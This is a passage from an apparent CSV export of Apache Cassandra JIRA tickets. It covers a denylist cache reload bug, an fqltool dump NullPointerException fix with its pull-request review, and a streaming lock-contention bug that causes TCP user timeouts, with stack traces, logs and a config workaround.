<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,,rtib,rtib,14/Dec/22 12:07,16/Dec/22 01:44,13/Jul/23 08:40,16/Dec/22 01:44,,,,,,,Documentation/Blog,,,,0,pull-request-available,The parameter as described in the blog article on new SSTable identifier has been changed since the article.,,maedhroz,mck,rtib,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Dec 16 01:44:43 UTC 2022,,,,,,,All,,,,"0|z1e1h4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Dec/22 01:44;mck;Committed as https://github.com/apache/cassandra-website/commit/b072ce0a2d50a6e4a443f98a80f98c4af953a123;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Denylist can load perpetually and too frequently if it fails persistently ,CASSANDRA-18116,13513476,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jwest,jwest,jwest,13/Dec/22 20:19,07/Jan/23 22:01,13/Jul/23 08:40,07/Jan/23 22:01,4.1.x,,,,,,Feature/Rate Limiting,,,,0,,"When the denylist fails its initial load it can [return a value of null|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/schema/PartitionDenylist.java#L453] for a key in the cache. The [BoundedLoadingCache implementation|https://github.com/ben-manes/caffeine/blob/master/caffeine/src/main/java/com/github/benmanes/caffeine/cache/BoundedLocalCache.java#L2591-L2615] that is used treats null as missing and will end up trying to load the key on reads. Besides the performance impact this can also lead to significant log spam leading to disk or CPU usage issues. ",,jmckenzie,jwest,maedhroz,sumanth.pasupuleti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-12106,,,,,,,,,,,,,,,,,,,,0.0,jwest,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat Jan 07 22:01:36 UTC 2023,,,,,,,All,,,,"0|z1e0rc:",9223372036854775807,,,,jmckenzie,,,,Normal,,4.1.1,,https://github.com/apache/cassandra/commit/073f7c36fa20e8d9410f306e57e7c7734ce74d1e,,,,,,,,,Existing tests (exploring if I can add one more to produce this case and show how reads trigger a load of the denylist),,,,,"30/Dec/22 17:24;jwest;[https://github.com/jrwest/cassandra/tree/jwest/18116-4.1]

 

Tests:  [j8|https://app.circleci.com/pipelines/github/jrwest/cassandra/128/workflows/474f1780-f3e5-4c61-8c26-c0ddf3408017] [j11|https://app.circleci.com/pipelines/github/jrwest/cassandra/128/workflows/2fe470f3-6743-42e6-b4ab-5d8399a9e814];;;","05/Jan/23 18:51;jmckenzie;We originally intentionally returned null on the {{PartitionDenylist.buildEmptyCache}} load() path on the Caffeine cache so as to preserve the old value in the cache. Which, as I type that out, seems fundamentally flawed to begin with; if you can't find an entry from CQL on the table you probably shouldn't have the old value persist in the cache since that makes removing entries... challenging.

Let's update the javadoc [here|https://github.com/jrwest/cassandra/blob/trunk/src/java/org/apache/cassandra/schema/PartitionDenylist.java#L395] to reflect our return pattern (empty entry) on not found and the implications to the cache.

Otherwise +1; a couple circle flakes on some dtests.;;;","06/Jan/23 00:29;jwest;Changed javadoc to ""@return empty denylist if we do not or cannot find the data, preserving the old value, otherwise the new value"".

 

Second run of tests here:  [j11|https://app.circleci.com/pipelines/github/jrwest/cassandra/129/workflows/d8db359f-3d98-4ba5-84ab-14083e387a6e] [j8|https://app.circleci.com/pipelines/github/jrwest/cassandra/129/workflows/94cf9c40-bd35-4983-a787-15b466fbd6df];;;","07/Jan/23 22:01;jwest;Second round of tests was all green. Had to do a trunk specific patch because it didn't merge using {{-s ours}} ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fqltool dump results NPE when null value inserted using prepared query,CASSANDRA-18113,13513470,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,n.v.harikrishna,n.v.harikrishna,n.v.harikrishna,13/Dec/22 18:54,01/Feb/23 15:03,13/Jul/23 08:40,01/Feb/23 14:57,4.0.8,4.1.1,5.0,,,,Tool/fql,,,,0,,"Enable fullquerylog, prepare insert statement and bind it with a null value and execute it. Executing fqltool dump after insert will result into NullPointerException.
 
Stept to reproduce:
    * Create cluster using ccm
    * Create  a table something like:
{code:java}
    CREATE TABLE ks1.t2 (
        id int PRIMARY KEY,
        value text
    ) ;
 {code}
    * Execute below code
{code:java}
    try (CqlSession cqlSession = CqlSession.builder().build()) {
        PreparedStatement preparedStatement = cqlSession.prepare(""INSERT INTO ks1.t2 (id, value) VALUES (?, ?)"");
        cqlSession.execute(preparedStatement.bind(6, null));
    }
{code}
    * Now running fqltool dump. It will run into NPE
 
 
Stack trace:
{code:java}
error: null
-- StackTrace --
java.lang.NullPointerException
    at net.openhft.chronicle.bytes.BytesStore.wrap(BytesStore.java:76)
    at net.openhft.chronicle.bytes.Bytes.wrapForRead(Bytes.java:179)
    at org.apache.cassandra.fqltool.commands.Dump.appendValuesToStringBuilder(Dump.java:222)
    at org.apache.cassandra.fqltool.commands.Dump.dumpQuery(Dump.java:179)
    at org.apache.cassandra.fqltool.commands.Dump.lambda$dump$0(Dump.java:123)
    at net.openhft.chronicle.queue.impl.single.StoreTailer.readDocument(StoreTailer.java:111)
    at org.apache.cassandra.fqltool.commands.Dump.dump(Dump.java:148)
    at org.apache.cassandra.fqltool.commands.Dump.run(Dump.java:68)
    at org.apache.cassandra.fqltool.FullQueryLogTool.main(FullQueryLogTool.java:65)
{code}",,maedhroz,n.v.harikrishna,smiklosovic,,,,,,,,,,,,"nvharikrishna opened a new pull request, #2050:
URL: https://github.com/apache/cassandra/pull/2050

   If fullquerylog is enabled and a prepared query executed with null value binded, then fqltool dump is running into NPE. Checking value for null before wrapping it.
   
   The [CASSANDRA-18113](https://issues.apache.org/jira/browse/CASSANDRA-18113)
   
   With this change, ""null"" is printed when a value is null. Sample output:
   ```
   Type: single-query
   Query start time: 1670955522494
   Protocol version: 5
   Generated timestamp:-9223372036854775808
   Generated nowInSeconds:1670955522
   Query: INSERT INTO ks1.t1 (id, value) VALUES (?, ?)
   Values: 
   00000000 00 00 00 0A                                      ····             
   null
   -----
   ```


;13/Dec/22 19:10;githubbot;600","smiklosovic commented on code in PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#discussion_r1047674634


##########
tools/fqltool/src/org/apache/cassandra/fqltool/commands/Dump.java:
##########
@@ -219,12 +222,19 @@ private static void appendValuesToStringBuilder(List<ByteBuffer> values, StringB
         boolean first = true;
         for (ByteBuffer value : values)
         {
-            Bytes bytes = Bytes.wrapForRead(value);
-            long maxLength2 = Math.min(1024, bytes.readLimit() - bytes.readPosition());
-            toHexString(bytes, bytes.readPosition(), maxLength2, sb);
-            if (maxLength2 < bytes.readLimit() - bytes.readPosition())
+            if(null == value)

Review Comment:
   `if (null == value)` - space after `if`.



;13/Dec/22 20:00;githubbot;600","nvharikrishna commented on code in PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#discussion_r1049249329


##########
tools/fqltool/src/org/apache/cassandra/fqltool/commands/Dump.java:
##########
@@ -219,12 +222,19 @@ private static void appendValuesToStringBuilder(List<ByteBuffer> values, StringB
         boolean first = true;
         for (ByteBuffer value : values)
         {
-            Bytes bytes = Bytes.wrapForRead(value);
-            long maxLength2 = Math.min(1024, bytes.readLimit() - bytes.readPosition());
-            toHexString(bytes, bytes.readPosition(), maxLength2, sb);
-            if (maxLength2 < bytes.readLimit() - bytes.readPosition())
+            if(null == value)

Review Comment:
   done.



;15/Dec/22 06:11;githubbot;600","nvharikrishna commented on PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#issuecomment-1352608426

   On a different note, printing ""------"" is skipped for the first value: https://github.com/apache/cassandra/blob/trunk/tools/fqltool/src/org/apache/cassandra/fqltool/commands/Dump.java#L230-L237.
   
   Not sure why it is done that way. But when there are multiple values, it is slightly difficult to differentiate the fist and second value. I can remove the ""first"" check too, if agreed.


;15/Dec/22 06:18;githubbot;600","smiklosovic commented on PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#issuecomment-1372273263

   @nvharikrishna can you please paste here the output so we clearly see what you mean by that ""--------"" comment?
   
   I think we should preserve the output and we should not change it. Just fixing the null issue should be enough here.


;05/Jan/23 14:19;githubbot;600","nvharikrishna commented on PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#issuecomment-1377663244

   If I create a table something like this:
   
   `CREATE TABLE t1 ( id int PRIMARY KEY , v1 int, v2 int, v3 int) ;`
   
   and inserted a row using:
   
   ```
   try (CqlSession cqlSession = CqlSession.builder().build()) {
       PreparedStatement preparedStatement = cqlSession.prepare(""INSERT INTO ks1.t1 (id, v1, v2, v3) VALUES (?, ?, ?, ?)"");
       cqlSession.execute(preparedStatement.bind(1, 1, 1, 1));
   }
   ```
   
   The output of fqltool looks something like this:
   
   ```
   Type: single-query
   Query start time: 1673373829119
   Protocol version: 5
   Generated timestamp:-9223372036854775808
   Generated nowInSeconds:1673373829
   Query: INSERT INTO ks1.t1 (id, v1, v2, v3) VALUES (?, ?, ?, ?)
   Values: 
   00000000 00 00 00 01                                      ····             
   00000000 00 00 00 01                                      ····             
   -----
   00000000 00 00 00 01                                      ····             
   -----
   00000000 00 00 00 01                                      ····             
   -----
   ```
   
   `-----` is not printed between the first and second value
   ```
   Values: 
   00000000 00 00 00 01                                      ····             
   00000000 00 00 00 01                                      ····             
   ```


;10/Jan/23 18:15;githubbot;600","smiklosovic commented on PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#issuecomment-1377749035

   @nvharikrishna thanks, interesting, that seems like a bug. Sorry it is taking so long to review this more closely. I should return to this soon.


;10/Jan/23 19:32;githubbot;600","smiklosovic commented on PR #2050:
URL: https://github.com/apache/cassandra/pull/2050#issuecomment-1408136156

   I am looking at this. Thanks for the patience.


;30/Jan/23 07:52;githubbot;600","smiklosovic closed pull request #2050: CASSANDRA-18113 fqltool dump NPE fix.
URL: https://github.com/apache/cassandra/pull/2050


;01/Feb/23 14:59;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,n.v.harikrishna,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Feb 01 15:03:33 UTC 2023,,,,,,,All,,,,"0|z1e0q0:",9223372036854775807,,,,smiklosovic,,,,Low,,4.0-alpha1,,https://github.com/apache/cassandra/commit/ba434b8231360347984c9a9906e5469767bfbcec,,,,,,,,,added junit,,,,,"13/Dec/22 19:11;n.v.harikrishna;Prepared a patch for the fix: [https://github.com/apache/cassandra/pull/2050]

 ;;;","30/Jan/23 08:31;smiklosovic;Hi [~n.v.harikrishna], thanks for this patch. I am +1 here, I just need to run the builds and get a review for some other committer.

I am not sure what to do with the issue you found with the output as described in the PR. This seems like a legit bug but it is out of scope of this PR. I suggest to merge this one which solves NPE and then we might create another one which fixes the output. That seems to be the most ideal solution here.

[~brandon.williams] would you go through this, please, once you have 5 minutes (1) ? Very easy patch, easy to understand. Do you agree with fixing just NPE here and then fixing the output in the other ticket?

(1) https://github.com/apache/cassandra/pull/2050;;;","30/Jan/23 08:32;smiklosovic;https://github.com/apache/cassandra/pull/2050;;;","30/Jan/23 08:40;smiklosovic;4.0 in progress - https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2247/
4.1 TBD
trunk TBD;;;","30/Jan/23 12:36;brandon.williams;I am +1 on fixing the NPE here if CI looks good.;;;","31/Jan/23 09:36;smiklosovic;4.0 [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/2252/]

4.1 j11 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1819/workflows/3051a3de-8033-4c0e-85c8-d6009a772e02]

4.1 j8 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1819/workflows/09496365-0672-495c-85f3-10900c04a1e0]

trunk j8 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1820/workflows/832d77c3-7c88-402b-a835-3fc10c46aff7]

trunk j11 [https://app.circleci.com/pipelines/github/instaclustr/cassandra/1820/workflows/edc5f5d6-5084-435e-9e30-6efefd31e07e]

there is fql multiplexer for added tests as well for circle builds;;;","01/Feb/23 10:44;smiklosovic;CI looks good to me. Based on [~brandon.williams] 's  +1 on NPE I am going to merge only that.;;;","01/Feb/23 14:58;smiklosovic;thank you [~n.v.harikrishna] for your contribution. I will create a ticket where we may fix the output.;;;","01/Feb/23 15:03;smiklosovic;created here https://issues.apache.org/jira/browse/CASSANDRA-18215;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Streaming progress virtual table lock contention can trigger TCP_USER_TIMEOUT and fail streaming,CASSANDRA-18110,13511953,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,jonmeredith,jonmeredith,11/Dec/22 00:34,17/Jan/23 10:02,13/Jul/23 08:40,12/Jan/23 17:49,4.1.1,5.0,,,,,Consistency/Bootstrap and Decommission,,,,0,,"Running four concurrent host replacements on a 4.1.0 development cluster has repeatably failed to complete bootstrap with all four hosts failing bootsrrap and staying in JOINING, logging the message.
{code:java}
ERROR 2022-12-07T21:15:48,860 [main] org.apache.cassandra.service.StorageService:2019 - Error while waiting on bootstrap to complete. Bootstrap will have to be restarted.
{code}
Bootstrap fails as the the FileStreamTasks on the streaming followers encounter an EOF while transmitting the files.
{code:java}
ERROR 2022-12-07T15:49:39,164 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:718 - [Stream #8d313690-7674-11ed-813f-95c261b64a82] Streaming error occurred on session with peer 1.2.3.4:7000 through 1.2.3.4:40292
org.apache.cassandra.net.AsyncChannelOutputPlus$FlushException: The channel this output stream was writing to has been closed
       at org.apache.cassandra.net.AsyncChannelOutputPlus.propagateFailedFlush(AsyncChannelOutputPlus.java:200) ~[cassandra.jar]
       at org.apache.cassandra.net.AsyncChannelOutputPlus.waitUntilFlushed(AsyncChannelOutputPlus.java:158) ~[cassandra.jar]
       at org.apache.cassandra.net.AsyncChannelOutputPlus.waitForSpace(AsyncChannelOutputPlus.java:140) ~[cassandra.jar]
       at org.apache.cassandra.net.AsyncChannelOutputPlus.beginFlush(AsyncChannelOutputPlus.java:97) ~[cassandra.jar]
       at org.apache.cassandra.net.AsyncStreamingOutputPlus.lambda$writeToChannel$0(AsyncStreamingOutputPlus.java:124) ~[cassandra.jar]
       at org.apache.cassandra.db.streaming.CassandraCompressedStreamWriter.lambda$write$0(CassandraCompressedStreamWriter.java:89) ~[cassandra.jar]
       at org.apache.cassandra.net.AsyncStreamingOutputPlus.writeToChannel(AsyncStreamingOutputPlus.java:120) ~[cassandra.jar]
       at org.apache.cassandra.db.streaming.CassandraCompressedStreamWriter.write(CassandraCompressedStreamWriter.java:88) ~[cassandra.jar]
       at org.apache.cassandra.db.streaming.CassandraOutgoingFile.write(CassandraOutgoingFile.java:177) ~[cassandra.jar]
       at org.apache.cassandra.streaming.messages.OutgoingStreamMessage.serialize(OutgoingStreamMessage.java:87) ~[cassandra.jar]
       at org.apache.cassandra.streaming.messages.OutgoingStreamMessage$1.serialize(OutgoingStreamMessage.java:45) ~[cassandra.jar]
       at org.apache.cassandra.streaming.messages.OutgoingStreamMessage$1.serialize(OutgoingStreamMessage.java:34) ~[cassandra.jar]
       at org.apache.cassandra.streaming.messages.StreamMessage.serialize(StreamMessage.java:39) ~[cassandra.jar]
       at org.apache.cassandra.streaming.async.StreamingMultiplexedChannel$FileStreamTask.run(StreamingMultiplexedChannel.java:311) [cassandra.jar]
       at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) [cassandra.jar]
       at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) [cassandra.jar]
       at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) [cassandra.jar]
       at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
       at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
       at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) [netty-all-4.1.58.Final.jar:4.1.58.Final]
       at java.lang.Thread.run(Thread.java:829) [?:?]
       Suppressed: java.nio.channels.ClosedChannelException
               at org.apache.cassandra.net.AsyncStreamingOutputPlus.doFlush(AsyncStreamingOutputPlus.java:82) ~[cassandra.jar]
               at org.apache.cassandra.net.AsyncChannelOutputPlus.flush(AsyncChannelOutputPlus.java:229) ~[cassandra.jar]
               at org.apache.cassandra.net.AsyncChannelOutputPlus.close(AsyncChannelOutputPlus.java:248) ~[cassandra.jar]
               at org.apache.cassandra.streaming.async.NettyStreamingChannel$1.close(NettyStreamingChannel.java:141) ~[cassandra.jar]
               at org.apache.cassandra.streaming.async.StreamingMultiplexedChannel$FileStreamTask.run(StreamingMultiplexedChannel.java:312) [cassandra.jar]
               at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:96) [cassandra.jar]
               at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:61) [cassandra.jar]
               at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:71) [cassandra.jar]
               at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]
               at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]
               at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) [netty-all-4.1.58.Final.jar:4.1.58.Final]
               at java.lang.Thread.run(Thread.java:829) [?:?]
Caused by: io.netty.channel.unix.Errors$NativeIoException: writevAddresses(..) failed: Connection timed out

{code}
Running a debug build with extra logging added to org.apache.cassandra.streaming.StreamSession#progress shows long periods where the streaming task does not log any progress events of up to 15 mins in duration. After these stalls the next attempt to write hits EOF.

Example caught by extra logging in org.apache.cassandra.streaming.StreamSession#progress
{code:java}
INFO  2022-12-07T15:10:56,149 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:1082 - Got stream progress event /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db 22216704/25673094 bytes (86%) s
ent to idx:0/1.2.3.4 for file /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db bytes 22216704 out of total 25673094
# ... 15min delay during which other streams can be seen transmitting to the same and other hosts
INFO  2022-12-07T15:25:29,614 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:1082 - Got stream progress event /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db 22282240/25673094 bytes (86%) sent to idx:0/1.2.3.4 for file /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db bytes 22282240 out of total 25673094
INFO  2022-12-07T15:25:29,615 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:1082 - Got stream progress event /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db 22347776/25673094 bytes (87%) sent to idx:0/1.2.3.4 for file /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db bytes 22347776 out of total 25673094


INFO  2022-12-07T15:25:29,626 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:1082 - Got stream progress event /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db 23855104/25673094 bytes (92%) sent to idx:0/1.2.3.4 for file /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db bytes 23855104 out of total 25673094
INFO  2022-12-07T15:25:29,627 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:1082 - Got stream progress event /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db 23920640/25673094 bytes (93%) sent to idx:0/1.2.3.4 for file /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db bytes 23920640 out of total 25673094
# ...12min delay while other streams continue to transmit
INFO  2022-12-07T15:37:29,775 [NettyStreaming-Outbound-/1.2.3.4.7000:2] org.apache.cassandra.streaming.StreamSession:1082 - Got stream progress event /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db 23986176/25673094 bytes (93%) sent to idx:0/1.2.3.4 for file /datadir/ks/tbl-xxx/ks-tbl-nb-87763-big-Data.db bytes 23986176 out of total 25673094
{code}
The issue has not succesfully been reproduced in other clusters or in a dtest, but is reliable reproducible on the cluster. The hosts being used are relatively large and have an available CPU count of 32 causing the streaming system to allow up to 32 concurrent streams.

[https://github.com/apache/cassandra/blob/81c616826ab3c8aa96467771d0e074a874efdd77/src/java/org/apache/cassandra/streaming/async/StreamingMultiplexedChannel.java#L93]

One possible explanation is that the stream rate limiter is not being fair and blocking sends long enough for TCP user timeout to fire and cause the kernel to close the socket which is detected on the next write, another is something is taking unusually long flushing the socket in AsyncChannelOutputPlus.beginFlush.

Restarting the instances with the streaming TCP user timeout disabled on the cluster (set to zero in the boostrapping instances config, and updated with JMX on the other instances) allowed the host-replacements to complete bootstrap successfully.",,aleksey,aratnofsky,benedict,bereng,brandon.williams,cscotta,dcapwell,e.dimitrova,jonmeredith,maedhroz,mck,,,,"smiklosovic closed pull request #2087: 4.1: CASSANDRA-18110: Streaming progress virtual table lock contention cantrigger TCP_USER_TIMEOUT and fail streaming
URL: https://github.com/apache/cassandra/pull/2087


;17/Jan/23 10:02;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jan 11 21:52:21 UTC 2023,,,,,,,All,,,,"0|z1drcw:",9223372036854775807,,,,aratnofsky,jmeredithco,,,Normal,,4.1.0,,https://github.com/apache/cassandra/commit/5be1038c5d38af32d3cbb0545d867f21304f3a46,,,,,,,,,existing tests,,,,,"11/Dec/22 17:45;jonmeredith;To clarify the workaround, on any new nodes being started, ensure the config is set with
 
{code:java}
internode_streaming_tcp_user_timeout: 0s
{code}
and on existing nodes in the cluster, the timeout can be reset with JMX without restarting
{code:java}
org.apache.cassandra.db/StorageService/InternodeStreamingTcpUserTimeoutInMS{code}
before the bootstrap attempt.;;;","13/Dec/22 00:32;jonmeredith;No success reproducing this issue in a test environment still.

Given that all attempts have failed to reproduce and have completed investigating our theories how this could happen without finding anything so far, this should not block the release.

Downgrading severity to Normal and will update this ticket with any future findings.;;;","22/Dec/22 23:13;jonmeredith;tl;dr an event listener added to collect data for the streaming status vtable is causing lock contention and starving the stream deserializer thread which causes a TCP user timeout on the sender that fails the stream.

Details - CASSANDRA-17390 exposed streaming status over a virtual table by listening to all streaming events with class {{StreamingState}}. It maintains a {{SessionInfo}} structure for each peer active in streaming, tracking a {{ProgressInfo}} for each streamed file that tracks transferred/total bytes for the file and updates it on every streaming event calling {{org.apache.cassandra.streaming.StreamingState.Sessions#create}}.

Streaming events include {{FILE_PROGRESS}} events generated on the {{StreamDeserializingTask}} for every section (64kb) read by {{CompressedStreamReader}}, and for every file components for {{CassandraEntireSSTableStreamReader}}. They happen frequently during heavy streaming activity.

In the event handler, {{Sessions.create}} recreates a summary {{org.apache.cassandra.streaming.StreamingState.Sessions}} object by iterating over all of the active session/files it knows about (multiple times) summing received/total for bytes and #files.

In one heap dump investigated the top three sessions has 5612, 1780 and 1528 received files. Generating the summary takes longer as the bootstrap proceeds and  creates contention in the synchronized org.apache.cassandra.streaming.StreamResultFuture.fireStreamEvent method. 

Method synchronization is unfair and causes starvation for some of the {{StreamDeserializerTask}} threads that consume the {{AsyncStreamingInputPlus}} slowing calls to netty to read from the streaming channel in {{rebuffer}}.

On the unfairly scheduled threads, eventually socket reads slow down enough to keep the TCP receive queue above the high water mark for 300s preventing an ACK of pending bytes to the sender, which trips the TCP user timeout on the sender causing it to close it before completing the transfer and failing the stream.

Raising the streaming TCP user timeout or disabling it entirely is still the correct workaround for this issue until it can be resolved.
{code:java}
""Stream-Deserializer-/1.2.3.4:7000-deadbeef"" #176 daemon prio=5 os_prio=0 cpu=299135.87ms elapsed=8341.21s tid=0x00007f25e2064a00 nid=0xe02f runnable  [0x00007f25b03a4000]
   java.lang.Thread.State: RUNNABLE
        at org.apache.cassandra.streaming.SessionInfo.getTotalSizeInProgress(SessionInfo.java:172)
        at org.apache.cassandra.streaming.SessionInfo.getTotalSizeReceived(SessionInfo.java:125)
        at org.apache.cassandra.streaming.StreamingState$Sessions.create(StreamingState.java:379)
        at org.apache.cassandra.streaming.StreamingState.handleStreamEvent(StreamingState.java:255)
        - locked <0x0000000604ac7bf0> (a org.apache.cassandra.streaming.StreamingState)
        at org.apache.cassandra.streaming.StreamResultFuture.fireStreamEvent(StreamResultFuture.java:218)
        - locked <0x000000060c3e57a0> (a org.apache.cassandra.streaming.StreamResultFuture)
        at org.apache.cassandra.streaming.StreamResultFuture.handleProgress(StreamResultFuture.java:208)
        at org.apache.cassandra.streaming.StreamSession.progress(StreamSession.java:1096)
        at org.apache.cassandra.db.streaming.CassandraCompressedStreamReader.read(CassandraCompressedStreamReader.java:96)
        at org.apache.cassandra.db.streaming.CassandraIncomingFile.read(CassandraIncomingFile.java:84)
        - locked <0x000000064a637510> (a org.apache.cassandra.db.streaming.CassandraIncomingFile)
        at org.apache.cassandra.streaming.messages.IncomingStreamMessage$1.deserialize(IncomingStreamMessage.java:55)
        at org.apache.cassandra.streaming.messages.IncomingStreamMessage$1.deserialize(IncomingStreamMessage.java:41)
        at org.apache.cassandra.streaming.messages.StreamMessage.deserialize(StreamMessage.java:50)
        at org.apache.cassandra.streaming.StreamDeserializingTask.run(StreamDeserializingTask.java:59)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.lang.Thread.run(java.base@11.0.16/Thread.java:829)
{code}
other streaming threads blocked on the lock
{code:java}
   java.lang.Thread.State: BLOCKED (on object monitor)
        at org.apache.cassandra.streaming.StreamResultFuture.fireStreamEvent(StreamResultFuture.java:214)
        - waiting to lock <0x000000060c3e57a0> (a org.apache.cassandra.streaming.StreamResultFuture)
        at org.apache.cassandra.streaming.StreamResultFuture.handleProgress(StreamResultFuture.java:208)
        at org.apache.cassandra.streaming.StreamSession.progress(StreamSession.java:1096)
        at org.apache.cassandra.db.streaming.CassandraCompressedStreamReader.read(CassandraCompressedStreamReader.java:96)
        at org.apache.cassandra.db.streaming.CassandraIncomingFile.read(CassandraIncomingFile.java:84)
        - locked <0x00000006e0f7aa58> (a org.apache.cassandra.db.streaming.CassandraIncomingFile)
        at org.apache.cassandra.streaming.messages.IncomingStreamMessage$1.deserialize(IncomingStreamMessage.java:55)
        at org.apache.cassandra.streaming.messages.IncomingStreamMessage$1.deserialize(IncomingStreamMessage.java:41)
        at org.apache.cassandra.streaming.messages.StreamMessage.deserialize(StreamMessage.java:50)
        at org.apache.cassandra.streaming.StreamDeserializingTask.run(StreamDeserializingTask.java:59)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.lang.Thread.run(java.base@11.0.16/Thread.java:829)
